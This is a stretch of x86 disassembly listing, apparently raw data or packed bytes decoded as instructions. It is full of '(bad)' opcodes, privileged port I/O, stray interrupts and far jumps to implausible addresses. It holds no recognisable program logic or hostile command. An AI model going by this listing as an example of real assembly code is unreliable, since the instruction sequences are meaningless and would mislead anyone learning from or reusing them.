  424424:	(bad)  
  424425:	cmp    DWORD PTR [edx+0x20d3c95d],0xd57a6043
  42442f:	fnstsw WORD PTR [ecx]
  424431:	or     al,0x34
  424433:	shl    dh,1
  424435:	outs   dx,BYTE PTR ds:[esi]
  424436:	jg     0x424477
  424438:	idiv   al
  42443a:	jnp    0x42442c
  42443c:	lea    esp,[esi+ebp*1-0x1e]
  424440:	cmc    
  424441:	fst    st(1)
  424443:	les    ecx,FWORD PTR [esi+0x73a45585]
  424449:	pop    ebx
  42444a:	int    0x7a
  42444c:	pop    ebp
  42444d:	sub    DWORD PTR [esi+0x28],ebp
  424450:	or     esi,ebx
  424452:	sahf   
  424453:	cdq    
  424454:	dec    ebp
  424455:	retf   
  424456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424457:	adc    edx,DWORD PTR [edi-0x3bc25247]
  42445d:	xchg   esi,eax
  42445e:	repnz push ebp
  424460:	test   DWORD PTR [ebp+eax*1-0x64ba1cc1],esi
  424467:	adc    al,0xbe
  424469:	or     esi,0xffffffa2
  42446c:	fcomp  st(6)
  42446e:	cmp    eax,0xa969f3f9
  424473:	push   eax
  424474:	enter  0x5872,0xfa
  424478:	pusha  
  424479:	or     al,0x38
  42447b:	cdq    
  42447c:	sbb    al,0xa5
  42447e:	jle    0x4244d6
  424480:	out    0x67,eax
  424482:	icebp  
  424483:	test   DWORD PTR ds:0xb24a14c,eax
  424489:	mov    dh,0x79
  42448b:	outs   dx,BYTE PTR ds:[esi]
  42448c:	out    0xf5,eax
  42448e:	mov    ah,0x17
  424490:	dec    edi
  424491:	mov    ch,0xe5
  424493:	imul   esi,DWORD PTR [edx],0xdadc17ca
  424499:	mov    ds:0x33a68d4b,al
  42449e:	xor    eax,0xd7635a12
  4244a3:	push   edx
  4244a4:	rol    ebp,1
  4244a6:	sub    dh,dl
  4244a8:	jb     0x4244d3
  4244aa:	fild   QWORD PTR [eax-0x60]
  4244ad:	scas   al,BYTE PTR es:[edi]
  4244ae:	(bad)  
  4244af:	ror    cl,cl
  4244b1:	fistp  DWORD PTR [ecx-0x473c6ef]
  4244b7:	icebp  
  4244b8:	dec    esp
  4244b9:	idiv   DWORD PTR [ebp+0x634cac51]
  4244bf:	mov    eax,0x6132d70e
  4244c4:	fucomi st,st(4)
  4244c6:	ins    DWORD PTR es:[edi],dx
  4244c7:	mov    cs,WORD PTR [eax]
  4244c9:	ficomp WORD PTR ds:0x6f935389
  4244cf:	mov    ecx,0xa26d8d98
  4244d4:	adc    eax,0xd11ffbba
  4244d9:	cmp    BYTE PTR [bx+si+0x46],dh
  4244dd:	loope  0x4244c4
  4244df:	pop    edx
  4244e0:	and    al,0xa4
  4244e2:	mov    edi,ss
  4244e4:	aam    0xc5
  4244e6:	add    cl,BYTE PTR [ebx]
  4244e8:	js     0x424479
  4244ea:	test   DWORD PTR [edi+eiz*4],0x324a2660
  4244f1:	loope  0x424494
  4244f3:	sbb    BYTE PTR [edx-0x7349c831],0x99
  4244fa:	xor    DWORD PTR [ebp-0x1987257d],esi
  424500:	or     al,0x5c
  424502:	mov    ecx,0xc325ef12
  424507:	mov    edi,edi
  424509:	pop    esp
  42450a:	adc    al,0xc8
  42450c:	fist   DWORD PTR [eax]
  42450e:	and    DWORD PTR [eax+eax*1],ebp
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x46],1
  424581:	mul    BYTE PTR [ebx+0x18398f9]
  424587:	add    BYTE PTR [ecx+eax*1],al
  42458a:	add    BYTE PTR [eax],al
  42458c:	fwait
  42458d:	sbb    DWORD PTR [esi+edi*4+0x1b],ebx
  424591:	call   0x1c2b7759
  424596:	mov    ah,0x73
  424598:	pop    ds
  424599:	xor    eax,0x10379ff4
  42459e:	dec    ebx
  42459f:	pop    ebp
  4245a0:	xchg   edi,eax
  4245a1:	sub    bh,al
  4245a3:	fist   WORD PTR [edx]
  4245a5:	mov    ah,0x61
  4245a7:	aaa    
  4245a8:	jmp    0x2c9fdc06
  4245ad:	adc    al,0x8b
  4245af:	jl     0x4245f0
  4245b1:	lods   al,BYTE PTR ds:[esi]
  4245b2:	jbe    0x4245c5
  4245b4:	dec    ecx
  4245b5:	pop    es
  4245b6:	ins    BYTE PTR es:[edi],dx
  4245b7:	mov    ch,0xc
  4245b9:	mov    al,0xff
  4245bb:	mov    edi,0x4ae1248
  4245c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245c1:	mov    ah,0x4c
  4245c3:	sbb    al,BYTE PTR [edx]
  4245c5:	jb     0x4245c9
  4245c7:	jno    0x424579
  4245c9:	call   0x9b5d:0x8a167853
  4245d0:	pop    ebp
  4245d1:	jl     0x42459f
  4245d3:	adc    DWORD PTR [ebp+0x2ecbddd6],edi
  4245d9:	mov    ebp,DWORD PTR [edx]
  4245db:	aam    0xa2
  4245dd:	mov    ah,BYTE PTR [ebx+0x48]
  4245e0:	(bad)  
  4245e1:	jl     0x4245b8
  4245e3:	ficom  WORD PTR [edi+eiz*2+0x3]
  4245e7:	jecxz  0x424667
  4245e9:	mov    ecx,ebp
  4245eb:	xor    bl,BYTE PTR [esi]
  4245ed:	sbb    eax,0x5b97bea3
  4245f2:	sbb    edi,ebp
  4245f4:	fild   DWORD PTR [edx+eiz*1+0x51]
  4245f8:	mov    esi,0xfbf86786
  4245fd:	out    0x9e,eax
  4245ff:	mov    WORD PTR [edx+0x692d3993],gs
  424605:	neg    DWORD PTR [edx]
  424607:	push   ss
  424608:	adc    BYTE PTR [edi+0x4d926975],cl
  42460e:	xchg   DWORD PTR [esi+0xe],ebp
  424611:	xchg   esi,eax
  424612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424613:	data16 int 0x15
  424616:	das    
  424617:	push   edx
  424618:	popf   
  424619:	fdiv   QWORD PTR [ebp+0x50]
  42461c:	push   ds
  42461d:	jo     0x424662
  42461f:	mov    ch,al
  424621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424622:	add    BYTE PTR [edx],ah
  424624:	rcr    ebx,0x32
  424627:	mov    ah,0x70
  424629:	out    dx,eax
  42462a:	pop    esi
  42462b:	inc    edx
  42462c:	sar    esp,0xdf
  42462f:	pop    edx
  424630:	div    BYTE PTR [esi]
  424632:	xor    DWORD PTR [ebx],ecx
  424634:	sti    
  424635:	inc    edi
  424636:	mov    esp,0x7d86ddb6
  42463b:	sbb    esi,DWORD PTR [edx]
  42463d:	add    DWORD PTR [ebx-0x57],edx
  424640:	pop    edx
  424641:	ins    DWORD PTR es:[edi],dx
  424642:	mov    edx,0xd08076a3
  424647:	sbb    DWORD PTR [edx+0x7797ad9],esi
  42464d:	xor    BYTE PTR [esi-0x43],dh
  424650:	punpckldq mm2,DWORD PTR [ebx+0x15f8d91e]
  424657:	ja     0x424620
  424659:	xchg   ecx,eax
  42465a:	adc    BYTE PTR [esi],ch
  42465c:	fild   DWORD PTR [esp+edi*2+0x4e]
  424660:	mov    ebp,0xbf266b6e
  424665:	(bad)  
  424666:	mov    esp,0x81505e5f
  42466b:	jmp    0x4246c2
  42466d:	test   al,0x17
  42466f:	pop    esp
  424670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424671:	shr    DWORD PTR [ecx-0x42],0x64
  424675:	sbb    DWORD PTR ds:0xae0ab9bd,ebx
  42467b:	loopne 0x42462d
  42467d:	arpl   dx,di
  42467f:	dec    esp
  424680:	cli    
  424681:	add    bh,BYTE PTR [ebp+0x428189a]
  424687:	sub    DWORD PTR [eax+0x47],ebp
  42468a:	xor    eax,0xc0375060
  42468f:	popa   
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi-0x6319c20e],bh
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	repz xchg esp,eax
  42470e:	mov    bh,bl
  424710:	mov    cl,0x4e
  424713:	inc    edi
  424714:	or     BYTE PTR [edx+0x53],dh
  424717:	sbb    dl,bh
  424719:	mov    bl,al
  42471b:	push   ebp
  42471c:	xor    BYTE PTR [ebx-0x44d0d05],0x7f
  424723:	stos   BYTE PTR es:[edi],al
  424724:	push   ecx
  424725:	or     al,0x90
  424727:	xchg   ecx,eax
  424728:	shl    BYTE PTR [eax+0x58],cl
  42472b:	out    0xac,eax
  42472d:	jl     0x42474f
  42472f:	pop    edi
  424730:	in     al,0x25
  424732:	mov    al,ds:0xee5c95cc
  424737:	mov    bl,dl
  424739:	add    BYTE PTR [edi+0x7a],dl
  42473c:	inc    ebp
  42473d:	xchg   ebp,eax
  42473e:	add    eax,0xf4e48592
  424743:	rcl    ebp,1
  424745:	js     0x424786
  424747:	xchg   ecx,eax
  424748:	inc    ebp
  424749:	cmp    eax,0xd05e3ea2
  42474e:	(bad)  
  42474f:	dec    ebp
  424750:	ins    DWORD PTR es:[edi],dx
  424751:	in     al,0xfe
  424753:	mov    dl,0x1d
  424755:	mov    esp,DWORD PTR [esi+0x45]
  424758:	xchg   ebp,eax
  424759:	or     al,0xaa
  42475b:	popf   
  42475c:	push   cs
  42475d:	into   
  42475e:	in     eax,0xc8
  424760:	fnstcw WORD PTR [eax+0x76]
  424763:	push   si
  424765:	dec    esp
  424766:	fcomi  st,st(7)
  424768:	or     BYTE PTR ds:0xfa773e1b,bl
  42476e:	mov    esp,0xf690ef39
  424773:	or     ah,dh
  424775:	or     DWORD PTR ds:0xa6db5366,edi
  42477b:	iret   
  42477c:	xor    BYTE PTR [esi],dh
  42477e:	mov    edi,0xe22f49fa
  424783:	arpl   cx,bp
  424785:	inc    ebp
  424786:	xchg   esi,eax
  424787:	jns    0x424728
  424789:	mov    ch,bh
  42478b:	mov    ebx,0x6bfd9403
  424790:	and    BYTE PTR [eax],bh
  424792:	and    BYTE PTR [ebx+ebp*1],0x9e
  424796:	pop    esp
  424797:	(bad)  
  424798:	out    dx,eax
  424799:	push   edi
  42479a:	out    0x7b,al
  42479c:	in     eax,0x47
  42479e:	cwde   
  42479f:	jmp    0x3418d78c
  4247a4:	fwait
  4247a5:	inc    edi
  4247a6:	fld    DWORD PTR ss:[edi-0x1]
  4247aa:	cmp    ecx,edi
  4247ac:	sahf   
  4247ad:	mov    cl,0x86
  4247af:	fs mov ch,0x40
  4247b2:	cdq    
  4247b3:	pop    ebx
  4247b4:	mov    BYTE PTR [ebx],dh
  4247b6:	cmp    ah,BYTE PTR [esi+0x6]
  4247b9:	jno    0x424804
  4247bb:	or     eax,0xe3b5eb5d
  4247c0:	push   ecx
  4247c1:	mov    edx,edx
  4247c3:	aad    0xdc
  4247c5:	int3   
  4247c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247c7:	sbb    dh,0x62
  4247ca:	and    ch,bl
  4247cc:	rcr    BYTE PTR [ebx+0x0],1
  4247cf:	test   DWORD PTR [eax+edi*8],ebx
  4247d2:	enter  0x55cc,0xe2
  4247d6:	xor    DWORD PTR [eax+ebp*4-0xe],0x759d555e
  4247de:	(bad)  
  4247df:	retf   
  4247e0:	fs jmp 0xfaea:0x8be6093c
  4247e8:	addr16 jge 0x42482b
  4247eb:	fld    QWORD PTR [ecx+ebx*8-0x29497fa8]
  4247f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247f3:	hlt    
  4247f4:	clc    
  4247f5:	fistp  WORD PTR [ecx-0x9]
  4247f8:	mov    ss:0x950a06a,eax
  4247fe:	sbb    BYTE PTR [ecx+0x65],dl
  424801:	cld    
  424802:	outs   dx,BYTE PTR ds:[esi]
  424803:	dec    ecx
  424804:	cmp    al,0x30
  424806:	push   es
  424807:	inc    eax
  424808:	pop    ecx
  424809:	dec    esi
  42480a:	sub    ebx,edi
  42480c:	mov    ds,WORD PTR [edi]
  42480e:	pop    esp
  42480f:	cli    
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	mov    bh,0x28
  424882:	mov    eax,ds:0x185a0cd
  424887:	add    BYTE PTR [ecx+eax*1],al
  42488a:	add    BYTE PTR [eax],al
  42488c:	leave  
  42488d:	cwde   
  42488e:	xchg   DWORD PTR [esi+0xb45642b],edx
  424894:	mov    ds:0xc135921b,eax
  424899:	add    ebp,ebx
  42489b:	out    0x72,eax
  42489d:	and    BYTE PTR [ebp+0x4b2278c],0xb6
  4248a4:	add    BYTE PTR [eax-0x63],bl
  4248a7:	jo     0x424857
  4248a9:	inc    DWORD PTR [edi+0x6c4037ca]
  4248af:	aas    
  4248b0:	dec    esi
  4248b1:	test   eax,0xfbeaffe5
  4248b6:	scas   eax,DWORD PTR es:[edi]
  4248b7:	push   0x79d43852
  4248bc:	sbb    eax,0x713961f5
  4248c1:	imul   ecx,edx,0xd0f05302
  4248c7:	and    eax,DWORD PTR [esi-0x287f9f56]
  4248cd:	dec    edx
  4248ce:	cdq    
  4248cf:	gs mov cl,0xfc
  4248d2:	out    0x9e,al
  4248d4:	or     BYTE PTR [ecx-0x47],0x4b
  4248d8:	cs retf 
  4248da:	shl    DWORD PTR [ecx-0x5fea650f],0x45
  4248e1:	or     al,0x1c
  4248e3:	(bad)  [ecx]
  4248e5:	enter  0x9c43,0x59
  4248e9:	mov    ds:0xca4335e0,al
  4248ee:	aam    0xa1
  4248f0:	out    dx,eax
  4248f1:	cmp    ecx,DWORD PTR ds:0x23504334
  4248f7:	das    
  4248f8:	mov    ah,0xfe
  4248fa:	cmp    ebp,DWORD PTR [ebx+ebx*1+0x4b]
  4248fe:	sub    BYTE PTR [edx],cl
  424900:	sbb    al,0x8c
  424902:	rol    BYTE PTR [eax],cl
  424904:	mov    bl,0xdb
  424906:	push   ebx
  424907:	xor    DWORD PTR [edx-0x16],0x3118293c
  42490e:	inc    edx
  42490f:	lods   eax,DWORD PTR ds:[esi]
  424910:	pop    edi
  424911:	fcomi  st,st(2)
  424913:	dec    esp
  424914:	shl    BYTE PTR cs:[eax+eiz*2],cl
  424918:	dec    edi
  424919:	jmp    0x6933e183
  42491e:	mov    esp,0xfb415e86
  424923:	mov    bh,0x27
  424925:	add    BYTE PTR [ebx+0x5f6bf484],bh
  42492b:	mov    ebp,0xa2796ee9
  424930:	adc    edx,DWORD PTR [ecx-0xe12a960]
  424936:	inc    eax
  424937:	mov    BYTE PTR [eax-0x7edfcfc4],bl
  42493d:	aas    
  42493e:	mov    bh,0x19
  424940:	bound  esi,QWORD PTR [ebx-0x38554a30]
  424946:	aad    0x5d
  424948:	or     DWORD PTR [esi+0x1e],edx
  42494b:	in     al,0xee
  42494d:	adc    ecx,0xe71c9ef8
  424953:	pop    ebp
  424954:	adc    ch,BYTE PTR [ebp-0x4c8344fa]
  42495a:	fidivr WORD PTR [ecx+0x4d483312]
  424960:	dec    edx
  424961:	add    dh,al
  424963:	jmp    0x2680:0xe929ad2b
  42496a:	mov    ds,eax
  42496c:	mov    esp,0x3d1e0acd
  424971:	outs   dx,DWORD PTR ds:[esi]
  424972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424973:	shl    DWORD PTR [esp+eiz*4+0x25fd24f1],1
  42497a:	jge    0x424980
  42497c:	ss push ebp
  42497e:	jno    0x42492b
  424980:	rcr    DWORD PTR [eax+0x498a2820],cl
  424986:	mov    dl,0x30
  424988:	jo     0x42492e
  42498a:	retf   0x8160
  42498d:	lds    esp,FWORD PTR [edx+0xc]
	...
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR ds:0xa47a2d37
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	xlat   BYTE PTR ds:[ebx]
  424a0d:	mov    eax,ecx
  424a0f:	gs jne 0x4249e0
  424a12:	jb     0x4249a3
  424a14:	lods   eax,DWORD PTR ds:[esi]
  424a15:	push   es
  424a16:	imul   edi,edi,0xffffffca
  424a19:	push   edi
  424a1a:	cmp    eax,0x500c6a03
  424a1f:	xchg   esi,eax
  424a20:	jle    0x424a24
  424a22:	out    0xc6,eax
  424a24:	cmp    DWORD PTR ds:0x9c4bbc76,ebx
  424a2a:	xor    BYTE PTR ss:[edx-0x16],ah
  424a2e:	mov    ds:0xe99fe097,eax
  424a33:	inc    eax
  424a34:	je     0x424a30
  424a36:	and    al,0x50
  424a38:	jge    0x424aa2
  424a3a:	ss or  al,0x3e
  424a3d:	pop    ds
  424a3e:	call   0xd4d8b3cc
  424a43:	mov    DWORD PTR [ebp+0x527b0284],ebx
  424a49:	ins    BYTE PTR es:[edi],dx
  424a4a:	cmp    ebx,ebp
  424a4c:	push   ebx
  424a4d:	retf   
  424a4e:	je     0x424a43
  424a50:	jmp    0xb476488d
  424a55:	leave  
  424a56:	js     0x424aa6
  424a58:	jp     0x424a5f
  424a5a:	lods   al,BYTE PTR ds:[esi]
  424a5b:	into   
  424a5c:	fidivr WORD PTR [edi+ebx*8+0x8e7760b]
  424a63:	jbe    0x424a37
  424a65:	add    cl,al
  424a67:	jno    0x424ade
  424a69:	inc    ecx
  424a6a:	push   eax
  424a6b:	inc    edi
  424a6c:	inc    ecx
  424a6d:	mov    cl,0xc1
  424a6f:	sbb    ah,BYTE PTR [eax+0x54]
  424a72:	push   ecx
  424a73:	or     al,0x83
  424a75:	fstp   DWORD PTR [esi-0x40bfeffd]
  424a7b:	add    BYTE PTR [edi],ch
  424a7d:	sub    edx,esp
  424a7f:	rcr    BYTE PTR [esi-0x68],cl
  424a82:	imul   eax,DWORD PTR [esi-0x75],0x3c145e83
  424a89:	pushf  
  424a8a:	cmp    edi,esi
  424a8c:	dec    esp
  424a8d:	ficom  DWORD PTR [edi]
  424a8f:	xor    BYTE PTR [eax+edx*8-0x44],dl
  424a93:	arpl   WORD PTR [edx+0xb],dx
  424a96:	shl    esp,1
  424a98:	aaa    
  424a99:	adc    eax,0x522f94c7
  424a9e:	dec    ebp
  424a9f:	shl    bh,1
  424aa1:	dec    eax
  424aa2:	mov    al,ds:0x6ab8cc6c
  424aa7:	aas    
  424aa8:	call   FWORD PTR [esi+0xe294e67]
  424aae:	push   ecx
  424aaf:	fcom   QWORD PTR [edx-0x6856a059]
  424ab5:	lods   eax,DWORD PTR ds:[esi]
  424ab6:	pusha  
  424ab7:	popa   
  424ab8:	imul   edi,DWORD PTR [ebx-0x42],0xbc607a57
  424abf:	bound  esi,QWORD PTR [edi]
  424ac1:	dec    ebx
  424ac2:	stos   BYTE PTR es:[edi],al
  424ac3:	jns    0x424aa1
  424ac5:	mov    ah,BYTE PTR [esi-0x74a32f12]
  424acb:	jno    0x424b20
  424acd:	xchg   edi,eax
  424ace:	cs daa 
  424ad0:	push   ds
  424ad1:	lahf   
  424ad2:	jnp    0x424b03
  424ad4:	scas   al,BYTE PTR es:[edi]
  424ad5:	adc    ah,BYTE PTR [edi]
  424ad7:	and    eax,0x85d6c0b5
  424adc:	out    0xec,al
  424ade:	es stos BYTE PTR es:[edi],al
  424ae0:	push   esp
  424ae1:	(bad)  
  424ae2:	xchg   ecx,eax
  424ae3:	mov    al,ds:0x96bb1fe5
  424ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae9:	pop    es
  424aea:	sbb    ch,bl
  424aec:	sbb    eax,0x20b3ef96
  424af1:	int3   
  424af2:	shl    DWORD PTR [edx],1
  424af4:	mov    al,ds:0x4afd4476
  424af9:	loope  0x424b4a
  424afb:	mov    WORD PTR [eax],?
  424afd:	or     ebx,ebp
  424aff:	jbe    0x424b4a
  424b01:	dec    ebp
  424b02:	lods   al,BYTE PTR ds:[esi]
  424b03:	push   0xb0186dc9
  424b08:	or     BYTE PTR [ebp+0x63c41e9f],cl
  424b0e:	arpl   ax,dx
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	xor    al,0x36
  424b82:	in     al,dx
  424b83:	repnz test al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	add    DWORD PTR [esi+0x78],ebp
  424b8f:	jp     0x424b5a
  424b91:	popa   
  424b92:	(bad)  
  424b93:	out    0x6f,eax
  424b95:	inc    edi
  424b96:	push   edi
  424b97:	xchg   ebp,eax
  424b98:	outs   dx,DWORD PTR ds:[esi]
  424b99:	or     eax,0xd295b621
  424b9e:	gs xchg ebx,eax
  424ba0:	dec    edi
  424ba1:	dec    eax
  424ba2:	push   0x7
  424ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ba5:	push   edi
  424ba6:	mov    ebx,0x7c54f6d5
  424bab:	dec    ebp
  424bac:	cmp    dh,BYTE PTR [esi-0x7a]
  424baf:	stos   DWORD PTR es:[edi],eax
  424bb0:	mov    esi,0x8477ee71
  424bb5:	mov    ch,0x5
  424bb7:	call   0x6bd55ac1
  424bbc:	dec    esp
  424bbd:	ret    0x751b
  424bc0:	or     al,0x4f
  424bc2:	test   eax,0x6796e9a5
  424bc7:	mov    esp,0x96b78668
  424bcc:	jns    0x424c35
  424bce:	or     DWORD PTR [ebp+0x3a],0xffffffe1
  424bd2:	ins    BYTE PTR es:[edi],dx
  424bd3:	sub    al,BYTE PTR [ebx-0x6bd176b8]
  424bd9:	jge    0x424b90
  424bdb:	leave  
  424bdc:	push   es
  424bdd:	sub    al,0xf7
  424bdf:	mov    cl,0x1e
  424be1:	shl    BYTE PTR [ebp+0x4c259fb1],0xd4
  424be8:	jnp    0x424c49
  424bea:	push   ss
  424beb:	loope  0x424b9e
  424bed:	xchg   ebp,eax
  424bee:	mov    es,WORD PTR [ecx+ecx*8+0x703f7040]
  424bf5:	mov    al,ds:0x404459f
  424bfa:	or     al,0xcc
  424bfc:	ror    BYTE PTR [ecx-0x219de291],0x7e
  424c03:	inc    ecx
  424c04:	sub    al,0x4f
  424c06:	fwait
  424c07:	mov    cl,0xac
  424c09:	les    ebp,FWORD PTR ds:0xf86c4788
  424c0f:	fcmovnb st,st(5)
  424c11:	(bad)  
  424c12:	push   edx
  424c13:	pop    edi
  424c14:	add    BYTE PTR [esp+edi*2-0x2b443d37],bl
  424c1b:	ins    DWORD PTR es:[edi],dx
  424c1c:	arpl   cx,cx
  424c1e:	cmp    al,0x22
  424c20:	xchg   edi,eax
  424c21:	pop    es
  424c22:	js     0x424be5
  424c24:	sub    ebx,DWORD PTR [eax+ecx*4]
  424c27:	inc    ebp
  424c28:	nop
  424c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c2a:	dec    ebx
  424c2b:	push   cs
  424c2c:	js     0x424c44
  424c2e:	aad    0xca
  424c30:	pushf  
  424c31:	call   0x4042a0f2
  424c36:	dec    eax
  424c37:	ins    DWORD PTR es:[edi],dx
  424c38:	pusha  
  424c39:	dec    esp
  424c3a:	cli    
  424c3b:	add    eax,0x944b7e20
  424c40:	cmp    eax,0xd354dff1
  424c45:	cmp    DWORD PTR [ecx],ecx
  424c47:	sub    eax,0x18ed20c7
  424c4c:	jbe    0x424ca3
  424c4e:	or     al,0xa9
  424c50:	ja     0x424cc9
  424c52:	lds    ebp,FWORD PTR [ebp-0x62]
  424c55:	leave  
  424c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c58:	mov    ebp,0xeb4b305d
  424c5d:	fs scas eax,DWORD PTR es:[edi]
  424c5f:	cmp    BYTE PTR [ecx],bh
  424c61:	or     al,ch
  424c63:	psubw  mm2,QWORD PTR [ebx+ecx*4]
  424c67:	call   0x3160:0x67f101ad
  424c6e:	out    dx,al
  424c6f:	out    0xd,eax
  424c71:	add    BYTE PTR [edi+0x6af4da83],al
  424c77:	in     eax,dx
  424c78:	cmp    ecx,DWORD PTR [edi+edx*4-0x244d6776]
  424c7f:	pop    edi
  424c80:	dec    ebp
  424c81:	xor    edi,DWORD PTR [ebx-0x18]
  424c84:	inc    ecx
  424c85:	or     DWORD PTR [ebp-0x71d4f94],esp
  424c8b:	pop    edx
  424c8c:	sub    BYTE PTR [ecx+0x1a43],al
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx+0x646251a8]
  424d02:	sub    al,0x2f
  424d04:	lods   al,BYTE PTR ds:[esi]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	mov    dh,0x46
  424d0e:	ins    DWORD PTR es:[edi],dx
  424d0f:	add    ebx,DWORD PTR [ebp+0x22]
  424d12:	popf   
  424d13:	repnz outs dx,DWORD PTR ds:[esi]
  424d15:	jp     0x424d18
  424d17:	(bad)  
  424d18:	sahf   
  424d19:	out    0x9d,al
  424d1b:	nop
  424d1c:	xchg   edi,eax
  424d1d:	inc    ebp
  424d1e:	dec    esi
  424d1f:	aaa    
  424d20:	push   ebp
  424d21:	into   
  424d22:	call   0x204b16e0
  424d27:	push   ebx
  424d28:	mov    dh,0xd8
  424d2a:	mov    WORD PTR [ebx+esi*8-0x7763f7fb],es
  424d31:	out    dx,eax
  424d32:	shl    DWORD PTR [edx+0x6b61e6a7],1
  424d38:	scas   eax,DWORD PTR es:[edi]
  424d39:	scas   al,BYTE PTR es:[edi]
  424d3a:	mov    ds:0x29c7311f,eax
  424d3f:	mov    WORD PTR [esi-0x77],fs
  424d42:	or     esi,DWORD PTR [edi-0x50]
  424d45:	mov    eax,ds:0xce6f4d1c
  424d4a:	loope  0x424cda
  424d4c:	pop    ecx
  424d4d:	fwait
  424d4e:	and    al,0x9a
  424d50:	fdivr  QWORD PTR [esi-0x6b]
  424d53:	cdq    
  424d54:	adc    bl,dl
  424d56:	adc    cl,dl
  424d58:	push   ecx
  424d59:	pop    ebx
  424d5a:	out    0xc0,al
  424d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d5d:	retf   0x75ac
  424d60:	dec    ebx
  424d61:	fistp  DWORD PTR [esi-0x5adc4490]
  424d67:	mov    dx,0x3350
  424d6b:	push   0x43244c0d
  424d70:	leave  
  424d71:	and    eax,0x2312c0f6
  424d76:	call   FWORD PTR [esi+0x6a]
  424d79:	add    DWORD PTR [ecx+eax*1],esp
  424d7c:	repz push esi
  424d7e:	mov    ds:0xe508cc5a,eax
  424d83:	dec    edi
  424d84:	jne    0x424d42
  424d86:	pop    eax
  424d87:	pop    ds
  424d88:	mov    dh,0x32
  424d8a:	xor    BYTE PTR [ecx],dh
  424d8c:	xchg   ebx,eax
  424d8d:	gs cwde 
  424d8f:	xchg   esi,eax
  424d90:	cmp    DWORD PTR [esi],0x58036f51
  424d96:	xor    al,0x87
  424d98:	or     ebp,DWORD PTR [ebp-0x525f8e6]
  424d9e:	push   esp
  424d9f:	hlt    
  424da0:	imul   ebx,DWORD PTR [ecx],0xffffff95
  424da3:	pop    edi
  424da4:	inc    ecx
  424da5:	push   cs
  424da6:	pusha  
  424da7:	test   al,0xe4
  424da9:	jb     0x424d8f
  424dab:	mov    ebp,edi
  424dad:	pop    eax
  424dae:	adc    al,0xca
  424db0:	push   edi
  424db1:	push   ds
  424db2:	je     0x424dd9
  424db4:	das    
  424db5:	lock outs dx,DWORD PTR ds:[esi]
  424db7:	mov    ds:0x7800842e,eax
  424dbc:	imul   ecx,DWORD PTR [ecx+0x3fae2c7c],0xa3c4033
  424dc6:	(bad)  
  424dc8:	xchg   edi,eax
  424dc9:	xchg   ecx,eax
  424dca:	nop
  424dcb:	cs push es
  424dcd:	(bad)  
  424dce:	stos   DWORD PTR es:[edi],eax
  424dcf:	les    esp,FWORD PTR [eax]
  424dd1:	jecxz  0x424d57
  424dd3:	jbe    0x424d75
  424dd5:	mov    edi,DWORD PTR [edi+0x2d]
  424dd8:	jnp    0x424df8
  424dda:	fcomp  DWORD PTR [ecx+0x44]
  424ddd:	leave  
  424dde:	inc    DWORD PTR [ebp+0x6d]
  424de1:	int3   
  424de2:	or     bl,BYTE PTR [eax-0x1a5fe4e4]
  424de8:	hlt    
  424de9:	mov    edi,0x3bbd1491
  424dee:	sub    bh,BYTE PTR [eax-0x65]
  424df1:	das    
  424df2:	(bad)  
  424df3:	std    
  424df4:	ss push es
  424df6:	fnstenv [edx-0x3e]
  424df9:	ins    DWORD PTR es:[edi],dx
  424dfa:	mov    ebx,0xa26062bd
  424dff:	and    eax,0xa31f3329
  424e04:	jecxz  0x424d8d
  424e06:	mov    dl,0x67
  424e08:	lods   eax,DWORD PTR ds:[esi]
  424e09:	cmc    
  424e0a:	push   0x47039b98
  424e0f:	add    BYTE PTR ss:[eax],al
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424f00
  424e81:	jmp    0x89f2f80a
